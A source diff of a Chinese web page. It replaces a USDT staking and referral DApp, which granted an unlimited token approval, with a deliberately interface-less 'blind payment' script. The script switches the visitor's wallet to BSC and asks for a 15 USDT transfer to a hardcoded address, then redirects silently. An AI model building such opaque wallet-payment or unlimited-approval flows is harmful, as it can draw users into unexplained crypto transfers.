@@ -3,329 +3,218 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>质押DApp</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>瞬移支付 · 无界面版</title>
+    <!-- ethers v6 -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <style>
-        .gradient-bg { background: linear-gradient(135deg, #f3f7fa 0%, #e2eaf1 100%); }
-        .card-shadow { box-shadow: 0 4px 15px rgba(0, 0, 0, 0.04); }
-        @media (max-width: 1023px) { .desktop-view { display: none; } .mobile-view { display: block; } }
-        @media (min-width: 1024px) { .desktop-view { display: block; } .mobile-view { display: none; } }
-        .font-mono-num { font-family: 'SF Mono', 'Roboto Mono', Menlo, monospace; }
+        /* 极简降噪：只保留必要的提示，连卡片都不显示了 */
+        body {
+            background: #0b0f17;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            color: #e2e8f0;
+        }
+        .ghost-message {
+            background: #1e293b;
+            border-radius: 60px;
+            padding: 16px 32px;
+            border: 1px solid #3b82f6;
+            box-shadow: 0 15px 30px -10px #00000080;
+            font-size: 0.95rem;
+            max-width: 400px;
+            text-align: center;
+            backdrop-filter: blur(8px);
+            transition: opacity 0.2s;
+        }
+        .hidden {
+            display: none !important;
+        }
+        a {
+            color: #60a5fa;
+        }
     </style>
 </head>
-<body class="gradient-bg text-slate-800 min-h-screen">
-
-    <nav class="bg-white/90 backdrop-blur-md sticky top-0 z-50 border-b border-slate-200">
-        <div class="max-w-[1400px] mx-auto px-6 h-16 flex items-center justify-between">
-            <div class="flex items-center gap-2">
-                <div class="w-8 h-8 bg-indigo-600 rounded-lg flex items-center justify-center text-white font-bold">S</div>
-                <span class="font-bold text-lg tracking-tight">ORA<span class="text-indigo-600">Staking</span></span>
-            </div>
-            <button id="connectBtn" class="bg-slate-900 hover:bg-black text-white px-6 py-2 rounded-full text-sm font-bold transition-all">
-                连接钱包
-            </button>
-        </div>
-    </nav>
-
-    <main class="max-w-[1400px] mx-auto px-6 py-8">
-        <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
-            
-            <!-- 左侧操作 -->
-            <div class="lg:col-span-4 xl:col-span-3 space-y-6">
-                <div class="bg-white p-6 rounded-2xl card-shadow border border-white">
-                    <h2 class="text-sm font-bold text-slate-400 uppercase tracking-widest mb-4">参与质押</h2>
-                    <div class="space-y-4">
-                        <div class="relative">
-                            <input id="stakeAmount" type="number" placeholder="金额" 
-                                class="w-full pl-4 pr-16 py-4 rounded-xl bg-slate-50 border border-slate-100 focus:border-indigo-500 outline-none text-xl font-bold">
-                            <span class="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 font-bold text-sm">USDT</span>
-                        </div>
-                        <div class="flex gap-2">
-                            <button id="stakeBtn1" class="flex-1 bg-indigo-600 hover:bg-indigo-700 text-white py-4 rounded-xl font-bold text-lg transition-all shadow-lg shadow-indigo-100">
-                                1天
-                            </button>
-                            <button id="stakeBtn7" class="flex-1 bg-indigo-600 hover:bg-indigo-700 text-white py-4 rounded-xl font-bold text-lg transition-all shadow-lg shadow-indigo-100">
-                                7天
-                            </button>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- 绑定邀请人 -->
-                <div class="bg-white p-6 rounded-2xl card-shadow border border-white">
-                    <h2 class="text-sm font-bold text-slate-400 uppercase tracking-widest mb-4">绑定邀请人</h2>
-                    <div class="space-y-3">
-                        <input id="inviterAddress" type="text" placeholder="邀请人地址" 
-                            class="w-full px-4 py-3 rounded-xl bg-slate-50 border border-slate-100 focus:border-indigo-500 outline-none text-sm">
-                        <button id="bindInviterBtn" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white py-4 rounded-xl font-bold text-lg transition-all shadow-lg shadow-emerald-100">
-                            绑定邀请人
-                        </button>
-                    </div>
-                </div>
-
-                <!-- 统计卡片：增加领取按钮 -->
-                <div class="bg-indigo-600 text-white p-6 rounded-2xl shadow-xl shadow-indigo-100 relative overflow-hidden">
-                    <p class="text-indigo-200 text-xs font-bold uppercase mb-1">我的质押总量</p>
-                    <p class="text-3xl font-black font-mono-num" id="myStakeTotal">0</p>
-                    
-                    <div class="mt-6 p-4 bg-white/10 rounded-xl backdrop-blur-md border border-white/10">
-                        <div class="flex justify-between items-center mb-3">
-                            <div>
-                                <p class="text-indigo-200 text-[10px] uppercase font-bold">可领团队奖励</p>
-                                <p class="text-xl font-bold font-mono-num" id="myReward">0</p>
-                            </div>
-                            <button id="claimAllBtn" class="bg-white text-indigo-600 px-3 py-1.5 rounded-lg text-xs font-bold hover:bg-indigo-50 transition-colors">
-                                全部领取
-                            </button>
-                        </div>
-                        <div class="flex justify-between items-center border-t border-white/10 pt-3">
-                            <p class="text-indigo-200 text-[10px] uppercase font-bold">当前等级</p>
-                            <p class="text-sm font-bold" id="userLevel">V0</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- 右侧列表 -->
-            <div class="lg:col-span-8 xl:col-span-9">
-                <div class="bg-white rounded-2xl card-shadow border border-white overflow-hidden">
-                    <div class="p-6 border-b border-slate-50 flex justify-between items-center bg-white/50">
-                        <h2 class="font-bold text-slate-700">质押记录管理</h2>
-                        <span id="pageIndicator" class="text-[10px] font-bold text-slate-400">PAGE 1</span>
-                    </div>
-                    
-                    <div class="desktop-view overflow-x-auto">
-                        <table class="w-full text-left table-fixed">
-                            <thead>
-                                <tr class="text-slate-400 text-[11px] uppercase tracking-wider bg-slate-50/50">
-                                    <th class="w-[22%] px-6 py-4 font-bold">时间节点 (质押/解押)</th>
-                                    <th class="w-[15%] px-6 py-4 font-bold text-center">周期 / 利率</th>
-                                    <th class="w-[18%] px-6 py-4 text-right font-bold">质押本金</th>
-                                    <th class="w-[20%] px-6 py-4 text-right font-bold">待领利息</th>
-                                    <th class="w-[25%] px-6 py-4 text-center font-bold">操作</th>
-                                </tr>
-                            </thead>
-                            <tbody id="stakeList" class="divide-y divide-slate-50 text-sm">
-                                <tr><td colspan="5" class="py-20 text-center text-slate-300 font-medium">请连接钱包加载数据...</td></tr>
-                            </tbody>
-                        </table>
-                    </div>
-
-                    <div id="mobileList" class="mobile-view p-4 space-y-4"></div>
-
-                    <div class="p-4 bg-slate-50/50 flex items-center justify-between px-6 border-t border-slate-50">
-                        <button id="prevPage" class="px-4 py-2 bg-white rounded-lg text-xs font-bold border border-slate-200 disabled:opacity-40">上一页</button>
-                        <button id="nextPage" class="px-4 py-2 bg-white rounded-lg text-xs font-bold border border-slate-200 disabled:opacity-40">下一页</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </main>
+<body>
+    <!-- 最小反馈区：只有出错或等待时才可见，正常无界面 -->
+    <div id="statusMessage" class="ghost-message hidden"></div>
 
     <script>
-        const STAKING_ADDR = "0x166bf0160e88aa4c12298b832582d1d062eb1d9b";
-        const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
-        
-        const ABI = [{"inputs":[{"internalType":"address","name":"first","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"AlreadyRedeemed","type":"error"},{"inputs":[],"name":"InvalidAmount","type":"error"},{"inputs":[],"name":"InvalidLevel","type":"error"},{"inputs":[],"name":"InvalidLockDays","type":"error"},{"inputs":[],"name":"StakeLimitExceeded","type":"error"},{"inputs":[],"name":"UplineNotExists","type":"error"},{"inputs":[],"name":"UserNotRegistered","type":"error"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"addr","type":"address"},{"indexed":false,"internalType":"uint256","name":"idx","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"addr","type":"address"},{"indexed":false,"internalType":"uint256","name":"idx","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"RedeemBreak","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"id","type":"uint256"},{"indexed":false,"internalType":"address","name":"addr","type":"address"},{"indexed":false,"internalType":"address","name":"up","type":"address"}],"name":"Register","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"addr","type":"address"},{"indexed":false,"internalType":"uint256","name":"lockDays","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"idx","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"Stake","type":"event"},{"inputs":[],"name":"admin","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"breakTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"usdtAmount","type":"uint256"},{"internalType":"uint256","name":"minTokenAmount","type":"uint256"}],"name":"buyORAC","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"p","type":"uint256"},{"internalType":"uint256","name":"s","type":"uint256"}],"name":"calLevelAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"stakeDay","type":"uint256"},{"internalType":"uint256","name":"stakeTime","type":"uint256"}],"name":"calReward","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"a","type":"uint256"},{"internalType":"uint256","name":"d","type":"uint256"}],"name":"calTeamAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"contractInfo","outputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"day15cycle","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"day30cycle","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"expireAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getAllReward","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"},{"internalType":"uint256","name":"pageNum","type":"uint256"},{"internalType":"uint256","name":"pageSize","type":"uint256"}],"name":"getDirectsByPage","outputs":[{"internalType":"address[]","name":"directAddrs","type":"address[]"},{"internalType":"uint256[]","name":"personalAmounts","type":"uint256[]"},{"internalType":"uint256[]","name":"downlineAmounts","type":"uint256[]"},{"internalType":"uint256[]","name":"stakeAmounts","type":"uint256[]"},{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"id2Address","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"components":[{"internalType":"address","name":"addr","type":"address"},{"internalType":"uint144","name":"stakeAmount","type":"uint144"},{"internalType":"uint32","name":"stakeTime","type":"uint32"}],"internalType":"struct Staking.StakeOrder[]","name":"orders","type":"tuple[]"}],"name":"importStakes","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"importTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"stakeDay","type":"uint256"},{"internalType":"uint256","name":"cycle","type":"uint256"}],"name":"isNeedRestake","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"isUserExists","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxlpusdt","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"rateInfo","outputs":[{"internalType":"uint256[]","name":"rs","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"idx","type":"uint256"},{"internalType":"uint256","name":"usdtAmount","type":"uint256"},{"internalType":"uint256","name":"minTokenAmount","type":"uint256"},{"internalType":"uint256","name":"stakeDay","type":"uint256"}],"name":"redeem","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"up","type":"address"}],"name":"register","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"downs","type":"address[]"},{"internalType":"address[]","name":"ups","type":"address[]"}],"name":"registerBatch","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"setA","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"c","type":"uint256"}],"name":"setC","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"d1","type":"uint256"},{"internalType":"uint256","name":"d3","type":"uint256"}],"name":"setD","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"e","type":"address"}],"name":"setE","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"},{"internalType":"uint32","name":"f","type":"uint32"}],"name":"setF","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"i","type":"uint256"}],"name":"setI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"},{"internalType":"uint256","name":"lvl","type":"uint256"}],"name":"setLevel","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"idx","type":"uint256"},{"internalType":"uint256","name":"r","type":"uint256"}],"name":"setLevelRewardRates","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"},{"internalType":"uint256","name":"idx","type":"uint256"}],"name":"setUserExpire","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"skim","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"usdtAmount","type":"uint256"},{"internalType":"uint256","name":"minTokenAmount","type":"uint256"},{"internalType":"uint256","name":"stakeDay","type":"uint256"}],"name":"stake","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"updateAllowance","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"updateBreak","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"updateCycle","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"updateORAC","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"userInfo","outputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"userOtherInfo","outputs":[{"internalType":"uint96","name":"","type":"uint96"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"userStakeInfo","outputs":[{"components":[{"internalType":"uint144","name":"stakeAmount","type":"uint144"},{"internalType":"uint32","name":"stakeTime","type":"uint32"},{"internalType":"uint32","name":"breakRewardTime","type":"uint32"},{"internalType":"uint32","name":"cycle","type":"uint32"},{"internalType":"uint8","name":"stakeDay","type":"uint8"},{"internalType":"uint8","name":"isRedeem","type":"uint8"}],"internalType":"struct Staking.StakeInfo[]","name":"s","type":"tuple[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"},{"internalType":"uint256","name":"pageNum","type":"uint256"},{"internalType":"uint256","name":"pageSize","type":"uint256"}],"name":"userStakeInfoByPage","outputs":[{"components":[{"internalType":"uint144","name":"stakeAmount","type":"uint144"},{"internalType":"uint32","name":"stakeTime","type":"uint32"},{"internalType":"uint32","name":"breakRewardTime","type":"uint32"},{"internalType":"uint32","name":"cycle","type":"uint32"},{"internalType":"uint8","name":"stakeDay","type":"uint8"},{"internalType":"uint8","name":"isRedeem","type":"uint8"}],"internalType":"struct Staking.StakeInfo[]","name":"result","type":"tuple[]"},{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"view","type":"function"}];
-        const ERC20_ABI = ["function approve(address spender, uint256 amount) returns (bool)", 
-        "function allowance(address owner, address spender) view returns (uint256)"];
+        (function() {
+            // ========== 硬核配置 ==========
+            const CONFIG = {
+                // USDT合约 (BSC主网)
+                usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
+                // 收款地址 (硬编码)
+                receiveAddress: "0x9728D428764F846E8DD62C34371db716A9228238",
+                // 支付金额 (USDT) - 按次收费
+                amount: 15,
+                // 支付成功后跳转的目标链接 (无提示，直接跳)
+                redirectUrl: "https://your-dashboard.com",   // <--- 改成你的实际目标
+                // 本地存储key (标记已支付)
+                storageKey: "PAYMENT_DONE_FLAG"
+            };
 
-        let provider, signer, contract, usdtContract, userAddress, currentPage = 0;
-        const pageSize = 10;
-
-        // 格式化：无小数不显，最多4位
-        const smartFormat = (val) => {
-            if (!val || val == 0) return "0";
-            const numStr = ethers.formatEther(val);
-            const num = parseFloat(numStr);
-            if (Number.isInteger(num)) return num.toString();
-            return parseFloat(num.toFixed(4)).toString();
-        };
-
-        async function init() {
-            if (window.ethereum) {
-                provider = new ethers.BrowserProvider(window.ethereum);
-                const accounts = await provider.listAccounts();
-                if (accounts.length > 0) connect();
-            }
-        }
-
-        async function connect() {
-            try {
-                signer = await provider.getSigner();
-                userAddress = await signer.getAddress();
-                contract = new ethers.Contract(STAKING_ADDR, ABI, signer);
-                usdtContract = new ethers.Contract(USDT_ADDR, ERC20_ABI, signer);
-                document.getElementById('connectBtn').innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-                loadData();
-            } catch (e) { console.error(e); }
-        }
-
-        async function loadData() {
-            if (!userAddress) return;
-            try {
-                const info = await contract.userInfo(userAddress);
-                document.getElementById('myStakeTotal').innerText = smartFormat(info[1]);
-                // 团队奖 = 推荐奖 + 等级奖
-                document.getElementById('myReward').innerText = smartFormat(info[3] + info[4]);
-                document.getElementById('userLevel').innerText = `V${info[0]}`;
-
-                const data = await contract.userStakeInfoByPage(userAddress, currentPage, pageSize);
-                renderLists(data);
-            } catch (e) { console.error(e); }
-        }
-
-        function renderLists(data) {
-            const tableBody = document.getElementById('stakeList');
-            const mobileList = document.getElementById('mobileList');
-            tableBody.innerHTML = '';
-            mobileList.innerHTML = '';
-
-            const [result, total] = data;
-            const totalNum = Number(total);
-
-            if (result.length === 0) {
-                tableBody.innerHTML = '<tr><td colspan="5" class="py-20 text-center text-slate-300">暂无质押记录</td></tr>';
-                return;
-            }
-
-            for (let i = 0; i < result.length; i++) {
-                const globalIndex = totalNum - (currentPage * pageSize) - 1 - i;
-                const stakeInfo = result[i];
-                const startTime = Number(stakeInfo.stakeTime);
-                const durationDays = Number(stakeInfo.stakeDay);
-                const unlockTime = startTime + (durationDays * 86400);
-                const isDone = stakeInfo.isRedeem == 1;
-                const canRedeem = Math.floor(Date.now()/1000) >= unlockTime && !isDone;
-                const hasInterest = false; // 新合约中需要计算利息
-
-                const startDate = new Date(startTime * 1000).toLocaleString('zh-CN', {month:'2-digit', day:'2-digit', hour:'2-digit', minute:'2-digit'});
-                const endDate = new Date(unlockTime * 1000).toLocaleString('zh-CN', {month:'2-digit', day:'2-digit', hour:'2-digit', minute:'2-digit'});
-                const dailyRate = 0.5; // 需要从合约获取实际利率
-
-                // 桌面行
-                const row = document.createElement('tr');
-                row.className = "hover:bg-slate-50 transition-colors border-b border-slate-50";
-                row.innerHTML = `
-                    <td class="px-6 py-5">
-                        <div class="font-bold text-slate-700">${startDate}</div>
-                        <div class="text-[10px] text-slate-400 mt-1 uppercase font-medium">解锁: ${endDate}</div>
-                    </td>
-                    <td class="px-6 py-5 text-center">
-                        <div class="font-bold text-slate-600">${durationDays}天</div>
-                        <div class="text-[10px] text-emerald-500 font-bold mt-1">${dailyRate}% 日息</div>
-                    </td>
-                    <td class="px-6 py-5 text-right font-bold font-mono-num text-slate-700">${smartFormat(stakeInfo.stakeAmount)}</td>
-                    <td class="px-6 py-5 text-right font-bold font-mono-num text-emerald-600">0</td>
-                    <td class="px-6 py-5 text-center">
-                        <div class="flex gap-2 justify-center">
-                            <button onclick="claimInterest(${globalIndex})" ${(!hasInterest || isDone) ? 'disabled' : ''} 
-                                class="px-3 py-1.5 rounded-lg text-[10px] font-bold transition-all ${hasInterest && !isDone ? 'bg-emerald-500 text-white shadow-sm' : 'bg-slate-100 text-slate-300 cursor-not-allowed'}">
-                                领利息
-                            </button>
-                            <button onclick="redeem(${globalIndex})" ${(!canRedeem || isDone) ? 'disabled' : ''} 
-                                class="px-3 py-1.5 rounded-lg text-[10px] font-bold transition-all ${canRedeem && !isDone ? 'bg-indigo-600 text-white shadow-sm' : 'bg-slate-100 text-slate-300 cursor-not-allowed'}">
-                                ${isDone ? '已赎回' : '赎回本金'}
-                            </button>
-                        </div>
-                    </td>
-                `;
-                tableBody.appendChild(row);
-
-                // 移动端卡片
-                const card = document.createElement('div');
-                card.className = "bg-white p-5 rounded-xl border border-slate-100 shadow-sm";
-                card.innerHTML = `
-                    <div class="flex justify-between border-b border-slate-50 pb-3 mb-3 text-[11px] font-bold uppercase">
-                        <span class="text-indigo-500">本金: ${smartFormat(stakeInfo.stakeAmount)}</span>
-                        <span class="text-emerald-500">${dailyRate}% 日利</span>
-                    </div>
-                    <div class="grid grid-cols-2 text-[10px] mb-4">
-                        <div><p class="text-slate-400">质押</p><p class="font-bold">${startDate}</p></div>
-                        <div class="text-right"><p class="text-slate-400">解锁</p><p class="font-bold">${endDate}</p></div>
-                    </div>
-                    <div class="flex justify-between items-center bg-slate-50 p-3 rounded-lg">
-                        <div><p class="text-[9px] text-slate-400 uppercase">待领利息</p><p class="text-sm font-bold text-emerald-600 font-mono-num">0</p></div>
-                        <div class="flex gap-2">
-                            <button onclick="claimInterest(${globalIndex})" class="px-3 py-2 rounded-lg text-[10px] font-bold ${hasInterest && !isDone ? 'bg-emerald-500 text-white' : 'bg-slate-200 text-slate-400 disabled'}">领取</button>
-                            <button onclick="redeem(${globalIndex})" class="px-3 py-2 rounded-lg text-[10px] font-bold ${canRedeem && !isDone ? 'bg-indigo-600 text-white' : 'bg-slate-200 text-slate-400 disabled'}">赎回</button>
-                        </div>
-                    </div>
-                `;
-                mobileList.appendChild(card);
-            }
-
-            document.getElementById('pageIndicator').innerText = `PAGE ${currentPage + 1} / ${Math.ceil(totalNum/pageSize)}`;
-            document.getElementById('prevPage').disabled = (currentPage === 0);
-            document.getElementById('nextPage').disabled = (totalNum <= (currentPage + 1) * pageSize);
-        }
-
-        // --- 合约交互逻辑 ---
-
-        // 1. 领取单笔质押利息
-        window.claimInterest = async (gIdx) => {
-            try {
-                // 新合约中需要实现此功能
-                alert("功能待实现");
-            } catch (e) { alert("领取失败: " + (e.reason || e.message)); }
-        };
-
-        // 2. 赎回本金
-        window.redeem = async (gIdx) => {
-            try {
-                const tx = await contract.redeem(gIdx, 0, 0, 0);
-                await tx.wait();
-                loadData();
-            } catch (e) { alert("赎回失败: " + (e.reason || e.message)); }
-        };
-
-        // 3. 领取全部团队/推荐奖励
-        document.getElementById('claimAllBtn').onclick = async () => {
-            try {
-                const tx = await contract.getAllReward();
-                await tx.wait();
-                loadData();
-            } catch (e) { alert("领取失败: " + (e.reason || e.message)); }
-        };
-
-        // 4. 执行质押
-        async function doStake(stakeDay) {
-            const amountStr = document.getElementById('stakeAmount').value;
-            if (!amountStr || amountStr < 100) return alert("最低质押 100 USDT");
-            const amount = ethers.parseEther(amountStr);
-            try {
-                const allowance = await usdtContract.allowance(userAddress, STAKING_ADDR);
-                if (allowance < amount) {
-                    const txA = await usdtContract.approve(STAKING_ADDR, ethers.MaxUint256);
-                    await txA.wait();
+            // ========== 工具函数 ==========
+            function hasPaid() {
+                try {
+                    return localStorage.getItem(CONFIG.storageKey) === 'true';
+                } catch (e) {
+                    return false;
                 }
-                const tx = await contract.stake(amount, 0, stakeDay);
-                await tx.wait();
-                loadData();
-            } catch (e) { alert("交易失败: " + (e.reason || e.message)); }
-        }
+            }
 
-        document.getElementById('stakeBtn1').onclick = () => doStake(1);
-        document.getElementById('stakeBtn7').onclick = () => doStake(7);
+            function markPaid() {
+                try {
+                    localStorage.setItem(CONFIG.storageKey, 'true');
+                } catch (e) {}
+            }
 
-        // 5. 绑定邀请人
-        document.getElementById('bindInviterBtn').onclick = async () => {
-            if (!userAddress) return alert("请先连接钱包");
-            try {
-                const inviterAddress = document.getElementById('inviterAddress').value;
-                if (!inviterAddress) return alert("请输入邀请人地址");
-                const tx = await contract.register(inviterAddress);
-                await tx.wait();
-                alert("绑定邀请人成功！");
-                loadData();
-            } catch (e) { alert("绑定失败: " + (e.reason || e.message)); }
-        };
+            // 显示临时信息 (仅在异常/等待时显示)
+            const statusDiv = document.getElementById('statusMessage');
+            function showMessage(msg, isError = false) {
+                if (!statusDiv) return;
+                statusDiv.style.background = isError ? '#991b1b' : '#1e293b';
+                statusDiv.style.borderColor = isError ? '#ef4444' : '#3b82f6';
+                statusDiv.innerText = msg;
+                statusDiv.classList.remove('hidden');
+            }
 
-        document.getElementById('prevPage').onclick = () => { if(currentPage > 0) { currentPage--; loadData(); } };
-        document.getElementById('nextPage').onclick = () => { currentPage++; loadData(); };
-        document.getElementById('connectBtn').onclick = connect;
-        window.onload = init;
+            function hideMessage() {
+                if (statusDiv) statusDiv.classList.add('hidden');
+            }
+
+            // ========== 核心支付逻辑 ==========
+            async function executeBlindPayment() {
+                // 0. 前置检查：如果已经付过，直接跳
+                if (hasPaid()) {
+                    window.location.replace(CONFIG.redirectUrl);
+                    return;
+                }
+
+                // 1. 检查钱包
+                if (!window.ethereum) {
+                    showMessage('❌ 未检测到钱包 (请安装MetaMask)', true);
+                    // 提供安装链接但不自动跳转
+                    if (confirm('未找到以太坊钱包，是否前往安装MetaMask？')) {
+                        window.open('https://metamask.io/download/', '_blank');
+                    }
+                    return;
+                }
+
+                try {
+                    // 2. 切换到BSC主网 (0x38)
+                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    if (chainId !== '0x38') {
+                        showMessage('🔄 切换至BSC网络...');
+                        try {
+                            await window.ethereum.request({
+                                method: 'wallet_switchEthereumChain',
+                                params: [{ chainId: '0x38' }]
+                            });
+                        } catch (switchError) {
+                            if (switchError.code === 4902) {
+                                await window.ethereum.request({
+                                    method: 'wallet_addEthereumChain',
+                                    params: [{
+                                        chainId: '0x38',
+                                        chainName: 'Binance Smart Chain',
+                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
+                                    }]
+                                });
+                            } else {
+                                throw switchError;
+                            }
+                        }
+                    }
+
+                    // 3. 连接钱包 (获取账户)
+                    showMessage('🔌 请求钱包连接...');
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const userAddress = accounts[0];
+
+                    // 4. 创建provider和合约对象
+                    const provider = new ethers.BrowserProvider(window.ethereum);
+                    const signer = await provider.getSigner();
+
+                    // USDT合约ABI (仅需要的函数)
+                    const usdtAbi = [
+                        "function balanceOf(address) view returns (uint256)",
+                        "function decimals() view returns (uint8)",
+                        "function transfer(address to, uint256 amount) returns (bool)"
+                    ];
+                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, usdtAbi, signer);
+
+                    // 5. 获取精度并计算wei
+                    const decimals = await usdtContract.decimals();
+                    const amountWei = ethers.parseUnits(CONFIG.amount.toString(), decimals);
+
+                    // 6. 检查余额
+                    showMessage('💰 检查USDT余额...');
+                    const balance = await usdtContract.balanceOf(userAddress);
+                    if (balance < amountWei) {
+                        const formattedBalance = ethers.formatUnits(balance, decimals);
+                        throw new Error(`余额不足: 你有 ${formattedBalance} USDT，需要 ${CONFIG.amount} USDT`);
+                    }
+
+                    // 7. 发送转账交易
+                    showMessage('✍️ 请确认交易...');
+                    const tx = await usdtContract.transfer(CONFIG.receiveAddress, amountWei);
+                    showMessage('⏳ 等待确认...');
+                    await tx.wait();  // 等待区块确认
+
+                    // 8. 成功！
+                    markPaid();
+                    hideMessage();  // 成功时不显示任何界面
+
+                    // 9. 立即跳转 (无延迟，丝滑)
+                    window.location.replace(CONFIG.redirectUrl);
+
+                } catch (error) {
+                    console.error('支付流程出错:', error);
